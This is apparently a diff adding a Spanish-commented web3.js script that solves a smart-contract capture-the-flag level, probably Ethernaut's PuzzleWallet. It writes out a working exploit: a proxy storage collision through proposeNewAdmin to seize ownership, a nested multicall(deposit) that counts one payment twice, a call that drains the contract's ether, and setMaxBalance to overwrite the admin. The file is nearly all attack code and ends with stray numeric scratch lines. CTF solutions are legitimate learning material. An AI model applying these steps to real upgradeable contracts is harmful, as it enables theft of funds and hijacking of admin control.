@@ -1,0 +1,145 @@
+//en remix se obtiene el abi del contrato PuzzleProxy
+var proxy = await new web3.eth.Contract([
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_admin",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "_implementation",
+				"type": "address"
+			},
+			{
+				"internalType": "bytes",
+				"name": "_initData",
+				"type": "bytes"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	},
+	{
+		"anonymous": false,
+		"inputs": [
+			{
+				"indexed": true,
+				"internalType": "address",
+				"name": "implementation",
+				"type": "address"
+			}
+		],
+		"name": "Upgraded",
+		"type": "event"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "fallback"
+	},
+	{
+		"inputs": [],
+		"name": "admin",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_expectedAdmin",
+				"type": "address"
+			}
+		],
+		"name": "approveNewAdmin",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"name": "pendingAdmin",
+		"outputs": [
+			{
+				"internalType": "address",
+				"name": "",
+				"type": "address"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_newAdmin",
+				"type": "address"
+			}
+		],
+		"name": "proposeNewAdmin",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "_newImplementation",
+				"type": "address"
+			}
+		],
+		"name": "upgradeTo",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"stateMutability": "payable",
+		"type": "receive"
+	}
+], instance)
+
+await proxy.methods.proposeNewAdmin(player).send({from: player}) //sobreescribe el owner
+
+await contract.owner() // should now be your address
+
+await contract.addToWhitelist(player); // me agrego a la whitelist
+await contract.whitelisted(player) // verifico (debe ser true)
+
+//genero firma de la llamada para hacer: multicall(multicall(deposit))
+web3.utils.keccak256('deposit()') // 0xd0e30db0
+o
+var {data: puzzleDeposit } = await contract.deposit.request() // 0xd0e30db0
+// function 2
+var { data: inceptionMultiCall } = await contract.multicall.request([ puzzleDeposit ]);
+
+await web3.eth.getBalance(instance) // verifico cuando ether tiene el contrato (1000000000000000wei)
+
+var our2Functions = [
+      puzzleDeposit,
+      inceptionMultiCall,
+    ];
+await contract.multicall(our2Functions, { from: player, value: 1000000000000000});
+await contract.execute(player, toWei("0.001"), 0x0) //si no funciona probar con 0.002
+
+
+await web3.eth.getBalance(instance) // verifico q es cero
+
+await contract.maxBalance().then(v=>v.toString()) //antes de ser admin verifico quien es el owner
+
+await contract.setMaxBalance(player); //ahora soy admin
+
+await contract.maxBalance().then(v=>v.toString()) //ahora veo que el owner cambio..como se que soy yo?
+
+    1 000 000 000 000 000
+1 000 000 000 000 000 000
